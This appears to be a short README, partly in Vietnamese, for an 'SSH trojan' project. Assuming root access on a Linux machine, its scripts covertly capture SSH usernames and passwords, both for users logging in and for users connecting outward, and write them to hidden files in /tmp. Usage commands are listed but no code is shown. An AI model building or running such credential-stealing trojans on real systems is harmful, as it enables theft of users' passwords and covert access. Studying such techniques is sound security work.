# SSH trojan logging

## Description
Trường hợp đang có quyền root để truy cập vào 1 máy tính linux. 
Xây dựng chương trình để lấy được username, password ssh trong 2 trường hợp sau mà không thay đổi luồng hoạt động bình thường:


+ Một user tiến hành truy cập vào máy tính đó thông qua ssh (chương trình sshtrojan1). Yêu cầu:
  Username, password log vào file /tmp/.log_sshtrojan1.txt
  Chỉ log lại username và password đúng.
  
  
+ Một người dùng đứng trên máy tính đó ssh đi một máy tính khác (chương trình sshtrojan2). Yêu cầu:
Username, password log vào file /tmp/.log_sshtrojan2.txt

## Usage

+ clone repo
+ cd ssh_trojan
+ sshtrojan1: `sudo ./ssh_trojan1.sh`
+ sshtrojan2: `sudo ./ssh_trojan2.sh`
+ see the log at /tmp/.log_sshtrojan[x].txt



